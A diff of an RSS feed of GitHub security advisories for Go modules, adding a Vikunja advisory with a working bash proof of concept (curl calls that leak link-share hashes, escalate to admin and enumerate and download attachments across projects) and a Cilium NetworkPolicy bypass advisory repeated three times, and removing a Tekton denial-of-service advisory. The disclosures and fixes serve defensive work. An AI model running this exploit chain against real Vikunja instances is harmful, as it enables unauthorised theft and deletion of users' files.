@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-26T16:22:25.999Z</updated>
+    <updated>2026-03-26T17:20:27.087Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,300 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[code.vikunja.io/api] Vikunja: Unauthenticated Instance-Wide Data Breach via Link Share Hash Disclosure Chained with Cross-Project Attachment IDOR]]></title>
+        <id>https://github.com/advisories/GHSA-2pv8-4c52-mf8j</id>
+        <link href="https://github.com/advisories/GHSA-2pv8-4c52-mf8j"/>
+        <updated>2026-03-26T16:56:26.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Two independently-exploitable authorization flaws in Vikunja can be chained to allow an unauthenticated attacker to download and delete every file attachment across all projects in a Vikunja instance. The <code>ReadAll</code> endpoint for link shares exposes share hashes (including admin-level shares) to any user with read access, enabling permission escalation. The task attachment <code>ReadOne</code>/<code>GetTaskAttachment</code> endpoint performs permission checks against a user-supplied task ID but fetches the attachment by its own sequential ID without verifying the attachment belongs to that task, enabling cross-project file access.</p>
+<h2 id="details">Details</h2>
+<h3 id="vulnerability-1-link-share-hash-disclosure-permission-escalation-entry-point">Vulnerability 1: Link Share Hash Disclosure (Permission Escalation Entry Point)</h3>
+<p>Tracked in <a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9</a></p>
+<p>The <code>LinkSharing.ReadAll()</code> method in <code>pkg/models/link_sharing.go:228-287</code> returns all link shares for a project, including the <code>Hash</code> field:</p>
+<pre><code class="language-go">// pkg/models/link_sharing.go:46-50
+type LinkSharing struct {
+    ID   int64  `xorm:"bigint autoincr not null unique pk" json:"id" param:"share"`
+    Hash string `xorm:"varchar(40) not null unique" json:"hash" param:"hash"`  // ← exposed in JSON
+    // ...
+}
+</code></pre>
+<p>The ReadAll clears passwords but not hashes:</p>
+<pre><code class="language-go">// pkg/models/link_sharing.go:272-277
+for _, s := range shares {
+    if sharedBy, has := users[s.SharedByID]; has {
+        s.SharedBy = sharedBy
+    }
+    s.Password = ""  // ← password cleared, but hash remains
+}
+</code></pre>
+<p>A link share user with read-only access can call <code>GET /api/v1/projects/:project/shares</code> (routed at <code>pkg/routes/routes.go:483</code>) to discover all shares, then authenticate with an admin-level share hash.</p>
+<h3 id="vulnerability-2-cross-project-attachment-idor-data-exfiltration">Vulnerability 2: Cross-Project Attachment IDOR (Data Exfiltration)</h3>
+<p>Tracked in <a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2</a></p>
+<p>The <code>GetTaskAttachment</code> handler in <code>pkg/routes/api/v1/task_attachment.go:156-186</code> performs the permission check against the task ID supplied in the URL:</p>
+<pre><code class="language-go">// pkg/models/task_attachment_permissions.go:25-28
+func (ta *TaskAttachment) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {
+    t := &amp;Task{ID: ta.TaskID}  // ← ta.TaskID from URL parameter
+    return t.CanRead(s, a)     // ← checks if user can read THIS task
+}
+</code></pre>
+<p>But <code>ReadOne</code> fetches the attachment by its own ID, ignoring the task:</p>
+<pre><code class="language-go">// pkg/models/task_attachment.go:110-111
+func (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {
+    exists, err := s.Where("id = ?", ta.ID).Get(ta)  // ← fetches by attachment ID only
+    // ta.TaskID is now overwritten with the ACTUAL task ID from the database
+    // But the permission check already passed using the attacker-controlled task ID
+</code></pre>
+<p>This means: specify a task you CAN access, but an attachment ID from a different project → permission check passes, wrong attachment is returned.</p>
+<h3 id="the-chain">The Chain</h3>
+<pre><code>Link share URL (public)
+    → POST /shares/{hash}/auth (get JWT)
+    → GET /projects/{id}/shares (discover admin share hash)
+    → POST /shares/{admin_hash}/auth (escalate to admin)
+    → GET /projects/{id}/tasks (find any accessible task ID)
+    → GET /tasks/{accessible_task}/attachments/{1..N} (enumerate ALL attachments)
+    → DELETE /tasks/{accessible_task}/attachments/{1..N} (destroy ALL attachments)
+</code></pre>
+<h2 id="poc">PoC</h2>
+<p><strong>Prerequisites:</strong> A Vikunja instance with at least one link share (any permission level). The attacker only needs the link share URL.</p>
+<pre><code class="language-bash">VIKUNJA="http://localhost:3456/api/v1"
+
+# Step 1: Authenticate with a known read-only link share hash
+# (Link share URLs look like: https://instance/share/HASH_HERE)
+SHARE_HASH="read-only-share-hash"
+
+TOKEN=$(curl -s -X POST "$VIKUNJA/shares/$SHARE_HASH/auth" \
+  -H "Content-Type: application/json" \
+  -d '{}' | jq -r '.token')
+
+echo "Got JWT: $TOKEN"
+
+# Step 2: Discover all link shares for the project (including admin shares)
+PROJECT_ID=1  # from the link share JWT claims
+
+SHARES=$(curl -s "$VIKUNJA/projects/$PROJECT_ID/shares" \
+  -H "Authorization: Bearer $TOKEN")
+
+echo "All shares exposed:"
+echo "$SHARES" | jq '.[].hash'  # All hashes visible, including admin shares
+
+# Step 3: Escalate to admin if available
+ADMIN_HASH=$(echo "$SHARES" | jq -r '.[] | select(.permission == 2) | .hash' | head -1)
+
+if [ -n "$ADMIN_HASH" ]; then
+  TOKEN=$(curl -s -X POST "$VIKUNJA/shares/$ADMIN_HASH/auth" \
+    -H "Content-Type: application/json" \
+    -d '{}' | jq -r '.token')
+  echo "Escalated to admin share: $ADMIN_HASH"
+fi
+
+# Step 4: Get a task ID we can legitimately access
+TASK_ID=$(curl -s "$VIKUNJA/projects/$PROJECT_ID/tasks" \
+  -H "Authorization: Bearer $TOKEN" | jq '.[0].id')
+
+echo "Using accessible task: $TASK_ID"
+
+# Step 5: Exploit attachment IDOR - enumerate ALL attachments across ALL projects
+for ATTACHMENT_ID in $(seq 1 100); do
+  RESP=$(curl -s -o /tmp/attachment_$ATTACHMENT_ID -w "%{http_code}" \
+    "$VIKUNJA/tasks/$TASK_ID/attachments/$ATTACHMENT_ID" \
+    -H "Authorization: Bearer $TOKEN")
+
+  if [ "$RESP" = "200" ]; then
+    echo "Downloaded attachment $ATTACHMENT_ID (from ANY project): /tmp/attachment_$ATTACHMENT_ID"
+  fi
+done
+
+# Step 6 (destructive, with admin share): Delete attachments from other projects
+# curl -s -X DELETE "$VIKUNJA/tasks/$TASK_ID/attachments/$TARGET_ATTACHMENT_ID" \
+#   -H "Authorization: Bearer $TOKEN"
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p><strong>Confidentiality (HIGH):</strong> An attacker with a single publicly-shared link share URL can download every file attachment across all projects in the Vikunja instance. Attachment IDs are sequential integers, making enumeration trivial. This includes confidential documents, images, and any files uploaded by any user in any project.</p>
+<p><strong>Integrity (HIGH):</strong> With the permission escalation from read-only to admin (via hash disclosure), the attacker can delete attachments from any project, causing data loss across the entire instance.</p>
+<p><strong>Attack prerequisites are minimal:</strong> Link shares are designed to be publicly shared — they're the mechanism for sharing projects with external collaborators. A single leaked or intentionally-shared link share URL (even read-only) is sufficient to compromise all file attachments instance-wide.</p>
+<p><strong>Blast radius:</strong> Every project, every task, every file attachment on the instance is exposed regardless of project membership, team boundaries, or access controls.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Fix 1 — Link Share Hash Disclosure:</strong> Clear the hash field in ReadAll responses:</p>
+<pre><code class="language-go">// pkg/models/link_sharing.go — in ReadAll loop (~line 272)
+for _, s := range shares {
+    if sharedBy, has := users[s.SharedByID]; has {
+        s.SharedBy = sharedBy
+    }
+    s.Password = ""
+    s.Hash = ""  // ← ADD THIS: never expose hashes to other share holders
+}
+</code></pre>
+<p><strong>Fix 2 — Attachment IDOR:</strong> Verify the attachment belongs to the specified task in both ReadOne and the download handler:</p>
+<pre><code class="language-go">// pkg/models/task_attachment.go — ReadOne
+func (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {
+    exists, err := s.Where("id = ? AND task_id = ?", ta.ID, ta.TaskID).Get(ta)
+    //                                ^^^^^^^^^^^^^^ ADD: verify task ownership
+    if err != nil {
+        return
+    }
+    // ...
+}
+</code></pre>
+<p>Both fixes should be applied — the attachment IDOR is exploitable independently by any authenticated user, and the link share hash disclosure enables permission escalation even without the attachment bug.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2pv8-4c52-mf8j">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2pv8-4c52-mf8j</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2</a></li>
+<li><a href="https://vikunja.io/changelog/vikunja-v2.2.2-was-released">https://vikunja.io/changelog/vikunja-v2.2.2-was-released</a></li>
+<li><a href="https://github.com/advisories/GHSA-2pv8-4c52-mf8j">https://github.com/advisories/GHSA-2pv8-4c52-mf8j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2pv8-4c52-mf8j</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-26T16:56:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium L7 proxy may bypass Kubernetes NetworkPolicy for same-node traffic]]></title>
+        <id>https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</id>
+        <link href="https://github.com/advisories/GHSA-hxv8-4j4r-cqgv"/>
+        <updated>2026-03-26T16:48:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Ingress <a href="https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy">Network Policies</a> are not enforced for traffic from pods to L7 Services (<a href="https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management">Envoy</a>, GAMMA) with a local backend on the same node, when <a href="https://docs.cilium.io/en/stable/network/concepts/routing/#routing">Per-Endpoint Routing</a> is enabled and <a href="https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing">BPF Host Routing</a> is disabled.</p>
+<p>Per-Endpoint Routing is disabled by default, but is automatically enabled in deployments using cloud IPAM, including Cilium ENI on EKS (<code>eni.enabled</code>), AlibabaCloud ENI (<code>alibabacloud.enabled</code>), Azure IPAM (<code>azure.enabled</code>, but not AKS BYOCNI), and some GKE deployments (<code>gke.enabled</code>; managed offerings such as GKE Dataplane V2 may use different defaults). It is typically not enabled in tunneled deployments, and chaining deployments are not affected. In practice, Amazon EKS with Cilium ENI mode is likely the most common affected environment.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue was fixed by #44693.</p>
+<p>This issue affects:</p>
+<ul>
+<li>Cilium v1.19 between v1.19.0 and v1.19.1 inclusive</li>
+<li>Cilium v1.18 between v1.18.0 and v1.18.7 inclusive</li>
+<li>All versions of Cilium prior to v1.17.13</li>
+</ul>
+<p>This issue is fixed in:</p>
+<ul>
+<li>Cilium v1.19.2</li>
+<li>Cilium v1.18.8</li>
+<li>Cilium v1.17.14</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>Disclaimer: There is currently no officially verified or comprehensive workaround for this issue. The only option would be to disable per-endpoint routes, but this will likely cause disruptions to ongoing connections, and potential conflicts if running in cloud providers.</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>The Cilium community has worked together with members of the Northflank and Isovalent teams to prepare these mitigations. Cilium thanks @sudeephb and @Champ-Goblem for reporting the issue and to @smagnani96 and @julianwiedmann for helping with the resolution.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>Anyone who believes a vulnerability affecting Cilium has been found is strongly encouraged to report it to the security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and any such report will be treated as top priority. Please also address any comments or questions on this advisory to the same mailing list.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-hxv8-4j4r-cqgv">https://github.com/cilium/cilium/security/advisories/GHSA-hxv8-4j4r-cqgv</a></li>
+<li><a href="https://github.com/cilium/cilium/pull/44693">https://github.com/cilium/cilium/pull/44693</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/concepts/routing/#routing">https://docs.cilium.io/en/stable/network/concepts/routing/#routing</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy">https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management">https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management</a></li>
+<li><a href="https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing">https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing</a></li>
+<li><a href="https://github.com/advisories/GHSA-hxv8-4j4r-cqgv">https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-26T16:48:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium L7 proxy may bypass Kubernetes NetworkPolicy for same-node traffic]]></title>
+        <id>https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</id>
+        <link href="https://github.com/advisories/GHSA-hxv8-4j4r-cqgv"/>
+        <updated>2026-03-26T16:48:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Ingress <a href="https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy">Network Policies</a> are not enforced for traffic from pods to L7 Services (<a href="https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management">Envoy</a>, GAMMA) with a local backend on the same node, when <a href="https://docs.cilium.io/en/stable/network/concepts/routing/#routing">Per-Endpoint Routing</a> is enabled and <a href="https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing">BPF Host Routing</a> is disabled.</p>
+<p>Per-Endpoint Routing is disabled by default, but is automatically enabled in deployments using cloud IPAM, including Cilium ENI on EKS (<code>eni.enabled</code>), AlibabaCloud ENI (<code>alibabacloud.enabled</code>), Azure IPAM (<code>azure.enabled</code>, but not AKS BYOCNI), and some GKE deployments (<code>gke.enabled</code>; managed offerings such as GKE Dataplane V2 may use different defaults). It is typically not enabled in tunneled deployments, and chaining deployments are not affected. In practice, Amazon EKS with Cilium ENI mode is likely the most common affected environment.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue was fixed by #44693.</p>
+<p>This issue affects:</p>
+<ul>
+<li>Cilium v1.19 between v1.19.0 and v1.19.1 inclusive</li>
+<li>Cilium v1.18 between v1.18.0 and v1.18.7 inclusive</li>
+<li>All versions of Cilium prior to v1.17.13</li>
+</ul>
+<p>This issue is fixed in:</p>
+<ul>
+<li>Cilium v1.19.2</li>
+<li>Cilium v1.18.8</li>
+<li>Cilium v1.17.14</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>Disclaimer: There is currently no officially verified or comprehensive workaround for this issue. The only option would be to disable per-endpoint routes, but this will likely cause disruptions to ongoing connections, and potential conflicts if running in cloud providers.</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>The Cilium community has worked together with members of the Northflank and Isovalent teams to prepare these mitigations. Cilium thanks @sudeephb and @Champ-Goblem for reporting the issue and to @smagnani96 and @julianwiedmann for helping with the resolution.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>Anyone who believes a vulnerability affecting Cilium has been found is strongly encouraged to report it to the security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and any such report will be treated as top priority. Please also address any comments or questions on this advisory to the same mailing list.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-hxv8-4j4r-cqgv">https://github.com/cilium/cilium/security/advisories/GHSA-hxv8-4j4r-cqgv</a></li>
+<li><a href="https://github.com/cilium/cilium/pull/44693">https://github.com/cilium/cilium/pull/44693</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/concepts/routing/#routing">https://docs.cilium.io/en/stable/network/concepts/routing/#routing</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy">https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management">https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management</a></li>
+<li><a href="https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing">https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing</a></li>
+<li><a href="https://github.com/advisories/GHSA-hxv8-4j4r-cqgv">https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-26T16:48:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium L7 proxy may bypass Kubernetes NetworkPolicy for same-node traffic]]></title>
+        <id>https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</id>
+        <link href="https://github.com/advisories/GHSA-hxv8-4j4r-cqgv"/>
+        <updated>2026-03-26T16:48:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Ingress <a href="https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy">Network Policies</a> are not enforced for traffic from pods to L7 Services (<a href="https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management">Envoy</a>, GAMMA) with a local backend on the same node, when <a href="https://docs.cilium.io/en/stable/network/concepts/routing/#routing">Per-Endpoint Routing</a> is enabled and <a href="https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing">BPF Host Routing</a> is disabled.</p>
+<p>Per-Endpoint Routing is disabled by default, but is automatically enabled in deployments using cloud IPAM, including Cilium ENI on EKS (<code>eni.enabled</code>), AlibabaCloud ENI (<code>alibabacloud.enabled</code>), Azure IPAM (<code>azure.enabled</code>, but not AKS BYOCNI), and some GKE deployments (<code>gke.enabled</code>; managed offerings such as GKE Dataplane V2 may use different defaults). It is typically not enabled in tunneled deployments, and chaining deployments are not affected. In practice, Amazon EKS with Cilium ENI mode is likely the most common affected environment.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue was fixed by #44693.</p>
+<p>This issue affects:</p>
+<ul>
+<li>Cilium v1.19 between v1.19.0 and v1.19.1 inclusive</li>
+<li>Cilium v1.18 between v1.18.0 and v1.18.7 inclusive</li>
+<li>All versions of Cilium prior to v1.17.13</li>
+</ul>
+<p>This issue is fixed in:</p>
+<ul>
+<li>Cilium v1.19.2</li>
+<li>Cilium v1.18.8</li>
+<li>Cilium v1.17.14</li>
+</ul>
+<h3 id="workarounds">Workarounds</h3>
+<p>Disclaimer: There is currently no officially verified or comprehensive workaround for this issue. The only option would be to disable per-endpoint routes, but this will likely cause disruptions to ongoing connections, and potential conflicts if running in cloud providers.</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>The Cilium community has worked together with members of the Northflank and Isovalent teams to prepare these mitigations. Cilium thanks @sudeephb and @Champ-Goblem for reporting the issue and to @smagnani96 and @julianwiedmann for helping with the resolution.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>Anyone who believes a vulnerability affecting Cilium has been found is strongly encouraged to report it to the security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and any such report will be treated as top priority. Please also address any comments or questions on this advisory to the same mailing list.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-hxv8-4j4r-cqgv">https://github.com/cilium/cilium/security/advisories/GHSA-hxv8-4j4r-cqgv</a></li>
+<li><a href="https://github.com/cilium/cilium/pull/44693">https://github.com/cilium/cilium/pull/44693</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/concepts/routing/#routing">https://docs.cilium.io/en/stable/network/concepts/routing/#routing</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy">https://docs.cilium.io/en/stable/network/kubernetes/policy/#network-policy</a></li>
+<li><a href="https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management">https://docs.cilium.io/en/stable/network/servicemesh/l7-traffic-management</a></li>
+<li><a href="https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing">https://docs.cilium.io/en/stable/operations/performance/tuning/#ebpf-host-routing</a></li>
+<li><a href="https://github.com/advisories/GHSA-hxv8-4j4r-cqgv">https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hxv8-4j4r-cqgv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-26T16:48:31.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/digitalocean/droplet-agent] DigitalOcean Droplet Agent: Command Injection via Metadata Service Endpoint]]></title>
         <id>https://github.com/advisories/GHSA-fh3m-562m-w4f6</id>
@@ -1622,274 +1916,6 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-03-25T19:36:22.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines controller panic via long resolver name in TaskRun/PipelineRun]]></title>
-        <id>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</id>
-        <link href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj"/>
-        <updated>2026-03-25T18:26:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A user with permission to create or update a TaskRun or PipelineRun can crash the Tekton Pipelines controller by setting <code>.spec.taskRef.resolver</code> (or <code>.spec.pipelineRef.resolver</code>) to a string of 31 characters or more, causing a denial of service for all reconciliation.</p>
-<h3 id="details">Details</h3>
-<p>The controller panics in <code>GenerateDeterministicNameFromSpec</code> when building a deterministic <code>ResolutionRequest</code> name. The generated name has the format <code>{resolver}-{hash}</code> and, when the resolver name is long enough, the result exceeds the DNS-1123 label limit of 63 characters.</p>
-<p>The truncation logic attempts to find a word boundary using <code>strings.LastIndex(name, " ")</code>. Since the generated name never contains spaces (it is composed of the resolver name, a dash, and a hex-encoded hash), <code>LastIndex</code> returns <code>-1</code>, which is then used as a slice bound:</p>
-<pre><code class="language-go">return name[:strings.LastIndex(name[:maxLength], " ")], nil
-// strings.LastIndex returns -1 → panic: slice bounds out of range [:-1]
-</code></pre>
-<p>The panic crashes the controller. Because the offending TaskRun or PipelineRun is re-reconciled on restart, the controller enters a <code>CrashLoopBackOff</code>, blocking all TaskRun and PipelineRun reconciliation cluster-wide until the offending resource is manually deleted.</p>
-<p>Built-in resolvers use short names (<code>git</code>, <code>cluster</code>, <code>bundles</code>, <code>hub</code>) and are not affected under normal usage. The vulnerability is exploitable by any user who can create TaskRuns or PipelineRuns with a custom resolver name.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Denial of service</strong> — A single malicious TaskRun or PipelineRun with a long resolver name is sufficient to crash the Tekton Pipelines controller into a restart loop, blocking all CI/CD reconciliation cluster-wide until the resource is removed.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in versions 1.0.1, 1.3.3, 1.6.1, 1.9.2, 1.10.2.</p>
-<p>The fix computes the hash first, then truncates only the prefix (resolver name) to fit within the DNS-1123 label limit, preserving the full hash to maintain determinism and uniqueness of <code>ResolutionRequest</code> names.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict who can create TaskRun and PipelineRun resources via Kubernetes RBAC. There is no validation-side workaround without patching.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>All releases from <strong>v0.60.0</strong> through <strong>v1.10.0</strong>.</p>
-<p>The vulnerable truncation logic was introduced in commit <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor"), first released in v0.60.0 (2024-05-22).</p>
-<p>Currently supported affected releases:</p>
-<ul>
-<li><strong>v1.10.x</strong> (latest)</li>
-<li><strong>v1.9.x</strong> (LTS, EOL 2027-01-30)</li>
-<li><strong>v1.6.x</strong> (LTS, EOL 2026-10-31)</li>
-<li><strong>v1.3.x</strong> (LTS, EOL 2026-08-04)</li>
-<li><strong>v1.0.x</strong> (LTS, EOL 2026-04-29)</li>
-</ul>
-<p>Releases prior to v0.60.0 are <strong>not affected</strong> — the truncation code did not exist.</p>
-<h3 id="acknowledgments">Acknowledgments</h3>
-<p>This vulnerability was reported by Oleh Konko (@1seal), who provided a thorough vulnerability analysis, proof-of-concept, and review of the fix. Thank you!</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix (main): <a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">5eead3f859b9</a></li>
-<li>Fix (v1.10.x): <a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">01673237c464</a></li>
-<li>Fix (v1.9.x): <a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">edc64bbf2232</a></li>
-<li>Fix (v1.6.x): <a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">0fa2d66cff81</a></li>
-<li>Fix (v1.3.x): <a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">5e4905fb6754</a></li>
-<li>Fix (v1.0.x): <a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">ebc197e2b973</a></li>
-<li>Introduced in: <code>ea1fa7ad1fdc</code> ("Remote Resolution Refactor")</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/tektoncd/pipeline/security/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33022">https://nvd.nist.gov/vuln/detail/CVE-2026-33022</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64">https://github.com/tektoncd/pipeline/commit/01673237c464cfac7e286183f5c9e9d6ec951a64</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932">https://github.com/tektoncd/pipeline/commit/0fa2d66cff814838c3a10cce252104c7fe618932</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d">https://github.com/tektoncd/pipeline/commit/5e4905fb6754efa5ecea54de195738d73fb0e01d</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6">https://github.com/tektoncd/pipeline/commit/5eead3f859b9f938e86039e4d29185092c1d4ee6</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf">https://github.com/tektoncd/pipeline/commit/ebc197e2b9733deedaa1624212ec66dcdf61eaaf</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90">https://github.com/tektoncd/pipeline/commit/edc64bbf22323fcf218170f19047c9bcd8163e90</a></li>
-<li><a href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj">https://github.com/advisories/GHSA-cv4x-93xx-wgfj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-17T19:46:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines controller panic via long resolver name in TaskRun/PipelineRun]]></title>
-        <id>https://github.com/advisories/GHSA-cv4x-93xx-wgfj</id>
-        <link href="https://github.com/advisories/GHSA-cv4x-93xx-wgfj"/>
-        <updated>2026-03-25T18:26:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A user with permission to create or update a TaskRun or PipelineRun can crash the Tekton Pipelines controller by setting <code>.spec.taskRef.resolver</code> (or <code>.spec.pipelineRef.resolver</code>) to a string of 31 characters or more, causing a denial of service for all reconciliation.</p>
-<h3 id="details">Details</h3>
